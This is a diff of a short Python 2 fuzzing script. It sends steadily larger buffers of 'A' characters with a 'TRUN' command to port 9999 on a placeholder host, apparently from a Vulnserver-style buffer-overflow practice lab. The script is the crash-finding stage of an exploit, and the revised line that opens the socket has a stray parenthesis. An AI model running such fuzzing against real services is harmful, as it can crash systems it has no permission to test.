@@ -5,18 +5,25 @@ from time import sleep
 # Change IP and Port on line 13 to Target and Port Application is running on
 # Change TRUN on line 15 to Command you are testing
 
-buffer = "A" * 100
+size = 100
 
-while True:
+while(size < 2000):
         try:
-                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.connect(('x.x.x.x', 9999))
-          
+                print "\nSending evil buffer with %s bytes" % size
+                
+                buffer = "A" * size
+                
+                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM))
+                
+                s.connect(("x.x.x.x", 9999))
                 s.send(('TRUN /.:/' + buffer))
+                
                 s.close()
+                
+                size += 100
                 sleep(1)
-                buffer = buffer + "A"*100
+                
               
         except:
-                print "Fuzzing crashed at %s bytes" % str(len(buffer))
+                print "\nFuzzing crashed at %s bytes" % str(len(buffer))
                 sys.exit()
